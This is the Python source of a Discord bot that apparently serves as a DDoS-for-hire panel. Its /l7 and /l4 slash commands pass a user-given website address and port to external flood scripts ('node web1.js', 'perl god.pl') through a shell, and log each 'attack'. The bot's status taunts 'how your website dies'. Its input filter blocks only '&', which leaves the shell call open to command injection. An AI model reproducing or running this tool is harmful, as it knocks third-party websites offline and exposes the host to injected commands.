import discord
from discord.ext import commands
import subprocess
import os
from colorama import Fore
import datetime
import time
from time import sleep

bot = discord.Bot()



os.system('clear')


@bot.event
async def on_ready():
	print(f"""{Fore.RED}

 ▄████▄  ▓█████ ▓█████▄  ▒█████        █     █░ ██▓ ███▄    █ 
▒██▀ ▀█  ▓█   ▀ ▒██▀ ██▌▒██▒  ██▒     ▓█░ █ ░█░▓██▒ ██ ▀█   █ 
▒▓█    ▄ ▒███   ░██   █▌▒██░  ██▒     ▒█░ █ ░█ ▒██▒▓██  ▀█ ██▒
▒▓▓▄ ▄██▒▒▓█  ▄ ░▓█▄   ▌▒██   ██░     ░█░ █ ░█ ░██░▓██▒  ▐▌██▒
▒ ▓███▀ ░░▒████▒░▒████▓ ░ ████▓▒░ ██▓ ░░██▒██▓ ░██░▒██░   ▓██░
░ ░▒ ▒  ░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░▒░▒░  ▒▓▒ ░ ▓░▒ ▒  ░▓  ░ ▒░   ▒ ▒ 
  ░  ▒    ░ ░  ░ ░ ▒  ▒   ░ ▒ ▒░  ░▒    ▒ ░ ░   ▒ ░░ ░░   ░ ▒░
░           ░    ░ ░  ░ ░ ░ ░ ▒   ░     ░   ░   ▒ ░   ░   ░ ░ 
░ ░         ░  ░   ░        ░ ░    ░      ░     ░           ░ 
░                ░                 ░                          

  {Fore.WHITE}If there is any error dm: fajka#9921 or Alfabeta#0001

	""")
	await bot.change_presence(status=discord.Status.dnd, activity=discord.Activity(type=discord.ActivityType.watching, name="how your website dies"))

@commands.cooldown(1, 120, commands.BucketType.user)
@bot.slash_command()
async def l7(ctx, address):
	"""Send a  ~test~ for selected website"""
	if ctx.channel.id != 1001994730068004939:
		await ctx.author.timeout(until = discord.utils.utcnow() + datetime.timedelta(seconds=3600), reason="gtfo bitch")
		embed = discord.Embed(title="❌ Fail!", colour=discord.Colour(0x6300ff),
									description=f"Wtf are you doing???\nCommands only here: <#1001994730068004939>`")
		embed.set_thumbnail(url="https://i.imgur.com/uQfokcw.png")
		embed.set_footer(text="cedo.shit", icon_url="https://sc.mogicons.com/l/dislike-emoticon-270.png")
		await ctx.response.send_message(embed=embed, ephemeral=True)
		return
	if "&" in address:
		await ctx.author.timeout(until = discord.utils.utcnow() + datetime.timedelta(seconds=3600), reason="gtfo bitch")
		embed = discord.Embed(title="❌ Fail!", colour=discord.Colour(0x6300ff),
									description=f"Wtf are you doing???\nDo not use '&' in address!")
		embed.set_thumbnail(url="https://i.imgur.com/uQfokcw.png")
		embed.set_footer(text="cedo.shit", icon_url="https://sc.mogicons.com/l/dislike-emoticon-270.png")
		await ctx.response.send_message(embed=embed, ephemeral=True)
		return
	subprocess.Popen([f'node web1.js {address} 60'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	embed = discord.Embed(title="✅ Success!", colour=discord.Colour(0x6300ff),
									description=f"Address: `{address}`\nTime: `60`")
	embed.set_thumbnail(url="https://i.imgur.com/uQfokcw.png")
	embed.set_footer(text="cedo.shit", icon_url="https://scarysymptoms.com/wp-content/uploads/2012/02/Poop-FREE.png")
	await ctx.response.send_message(embed=embed, ephemeral=True)
	print(f'[L7] {ctx.author} sent attack on {address}')
	return

@commands.cooldown(1, 120, commands.BucketType.user)
@bot.slash_command()
async def l4(ctx, address, port):
	"""Send a  ~test~ for selected website"""
	if ctx.channel.id != 1002160017614577665:
		await ctx.author.timeout(until = discord.utils.utcnow() + datetime.timedelta(seconds=3600), reason="gtfo bitch")
		embed = discord.Embed(title="❌ Fail!", colour=discord.Colour(0x6300ff),
									description=f"Wtf are you doing???\nCommands only here: <#1001994730068004939>`")
		embed.set_thumbnail(url="https://i.imgur.com/uQfokcw.png")
		embed.set_footer(text="cedo.shit", icon_url="https://sc.mogicons.com/l/dislike-emoticon-270.png")
		await ctx.response.send_message(embed=embed, ephemeral=True)
		return
	if "&" in address:
		await ctx.author.timeout(until = discord.utils.utcnow() + datetime.timedelta(seconds=3600), reason="gtfo bitch")
		embed = discord.Embed(title="❌ Fail!", colour=discord.Colour(0x6300ff),
									description=f"Wtf are you doing???\nDo not use '&' in address!")
		embed.set_thumbnail(url="https://i.imgur.com/uQfokcw.png")
		embed.set_footer(text="cedo.shit", icon_url="https://sc.mogicons.com/l/dislike-emoticon-270.png")
		await ctx.response.send_message(embed=embed, ephemeral=True)
		return
	subprocess.Popen([f'perl god.pl {address} {port} 65500 60'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	embed = discord.Embed(title="✅ Success!", colour=discord.Colour(0x6300ff),
									description=f"Address: `{address}`\nTime: `60`")
	embed.set_thumbnail(url="https://i.imgur.com/uQfokcw.png")
	embed.set_footer(text="cedo.shit", icon_url="https://scarysymptoms.com/wp-content/uploads/2012/02/Poop-FREE.png")
	await ctx.response.send_message(embed=embed, ephemeral=True)
	print(f'[L4] {ctx.author} sent attack on {address} using {port} port')
	return







@bot.event
async def on_application_command_error(ctx, error):
	if isinstance(error, commands.CommandOnCooldown):
		embed = discord.Embed(title="⌚ Cooldown!", colour=discord.Colour(0x6300ff),
									description=f"You have to wait `{round(error.retry_after, 2)}s`!")
		embed.set_thumbnail(url="https://i.imgur.com/uQfokcw.png")
		embed.set_footer(text="cedo.shit", icon_url="https://sc.mogicons.com/l/dislike-emoticon-270.png")
		await ctx.response.send_message(embed=embed, ephemeral=True)
		return


bot.run('TOKEN')

